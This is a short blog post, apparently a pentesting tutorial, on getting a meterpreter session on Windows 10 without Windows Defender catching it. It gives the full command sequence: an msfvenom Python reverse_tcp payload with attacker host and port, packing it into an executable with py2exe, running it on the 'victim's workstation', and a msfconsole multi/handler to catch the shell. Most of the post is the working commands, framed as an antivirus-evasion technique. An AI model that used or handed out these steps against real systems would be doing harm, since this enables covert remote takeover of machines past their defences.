---
published: true
layout: post
categories: articles
tags:
  - python
  - rev_shell
  - meterpreter
---

# Summary
{:.no_toc}

* toc
{:toc}

# Introduction

So, the situation, it is possible to download a file to a machine that is being tested as part of a Pentest or other legitimate activity in Windows, and it is even possible to execute it. If we are talking about the latest, tenth version of the OS, then we will run into its Windows Defender, and the likelihood of stumbling upon an antivirus is great. In such a situation, a very convenient and expandable meterpreter will not work, what is the alternative?

## Python
{:id="python"}

That's the answer. Using Python in conjunction with metasploit and msfvenom allows us to get a decent alternative to the classic meterpreter with most of its convenient features. True, some will have to sacrifice, it will not be possible to use such commands as getsystem and it will not be possible to migrate to the process.


# Let's start

The general scheme is as follows: we generate the python code using msfvenom, feed it to py2exe, launch the binary on the victim machine and catch the session.
<br><br>
First, install py2exe under version 3.4, since everything above is not supported.
~~~
pip install py2exe
~~~
Or, if you like updating like me:
~~~
python -3.4 –m pip install py2exe
~~~

<br><br>

Next, create the .py code:
~~~
msfvenom -p python/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > payload.py
~~~

It is necessary to add "import getpass" to the code, which for some reason does not do the default msfvenom.

<br><br>


Make the .exe file:
<br>
~~~
python34 -m py2exe.build_exe payload.py --bundle-files 0
~~~


And run it on the victim's workstation preliminarily run handler:<br>
~~~
msfconsole
use exploit/multi/handler
set PAYLOAD python/meterpreter/reverse_tcp
set lhost eth0
set lport <PORT>
run
~~~

And we get the command shell:

![Python_shell]({{ site.baseurl }}/assets/img/posts_rus/python_shell.jpg){:class="img"}

# Conclusion
{:id="end"}

A simple and effective way to combat Windows Defender if you do not want to lose the convenient and familiar meterpreter functionality in favor of more native solutions, such as ssh or telnet.
<br><br>
